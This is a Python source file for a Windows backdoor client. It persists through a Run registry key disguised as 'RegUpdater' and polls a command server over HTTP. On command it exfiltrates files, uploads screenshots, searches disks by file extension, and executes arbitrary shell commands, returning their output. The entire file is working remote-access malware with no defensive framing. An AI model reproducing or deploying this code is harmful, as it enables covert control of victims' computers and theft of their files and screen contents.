import requests
import os
import subprocess
import time
import shutil
import winreg as wreg
import random
from PIL import ImageGrab
import tempfile

path = os.getcwd().strip('/n')

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode().split('=')
destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'

if not os.path.exists(destination):
    shutil.copyfile(path + '\client.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()

def connect():
    while True:
        req = requests.get('http://192.168.162.128:8080')
        command = req.text

        if 'terminate' in command:
            return 1

        elif 'grab' in command:
            grab, path = command.split("*")
            if os.path.exists(path):
                url = "http://192.168.162.128:8080/store"
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url='http://192.168.162.128:8080', data='[-] Not able to open the file')

        elif 'screencap' in command:
            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")

            url = "http://192.168.162.128:8080/store"
            files = {'file':open(dirpath + "\img.jpg", 'rb')}
            r = requests.post(url, files=files)

            files['file'].close()
            shutil.rmtree(dirpath)

        elif 'search' in command:
            command = command[7:] 
            path, ext = command.split('*')
            lists = ''
            for dirpath, dirname, files in os.walk(path):
                for file in files:
                    if file.endswith(ext):
                        lists = lists + '\n' + os.path.join(dirpath, file)
            requests.post(url = 'http://192.168.162.128:8080', data=lists)

        else:
            CMD = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            post_response = requests.post(url='http://192.168.162.128:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://192.168.162.128:8080', data=CMD.stderr.read())
        time.sleep(3)

while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1, 10)
        time.sleep(int(sleep_for))
        pass
